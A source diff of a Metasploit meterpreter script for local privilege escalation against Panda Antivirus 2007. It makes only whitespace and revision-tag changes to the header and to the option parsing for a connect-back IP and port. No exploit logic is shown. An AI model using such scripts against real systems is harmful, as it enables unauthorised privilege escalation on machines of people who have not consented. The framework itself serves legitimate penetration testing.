@@ -1,4 +1,5 @@
 # $Id: panda_2007_pavsrv51.rb 8734 2010-03-07 22:49:08Z mc $
+# $Revision: $
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -13,7 +14,7 @@
 # local attacker can gain elevated privileges.
 #
 # This script has only been tested against Panda Antivirus 2007.
-# 
+#
 # BID - 4257
 # mc[@]metasploit.com
 ##
@@ -22,9 +23,9 @@
 # Options
 #
 opts = Rex::Parser::Arguments.new(
-        "-h"  => [ false,  "This help menu"],
-        "-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
-        "-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
+	"-h"  => [ false,  "This help menu"],
+	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
+	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
 )
 
 #
@@ -38,16 +39,16 @@ rport = 4444
 # Option parsing
 #
 opts.parse(args) do |opt, idx, val|
-        case opt
-        when "-h"
-                print_status("Panda Antivirus 2007 privilege escalation.")
+	case opt
+	when "-h"
+		print_status("Panda Antivirus 2007 privilege escalation.")
 		print_line(opts.usage)
 		raise Rex::Script::Completed
-        when "-r"
-                rhost = val
-        when "-p"
-                rport = val.to_i
-        end
+	when "-r"
+		rhost = val
+	when "-p"
+		rport = val.to_i
+	end
 end
 if client.platform =~ /win32|win64/
 	client.sys.process.get_processes().each do |m|
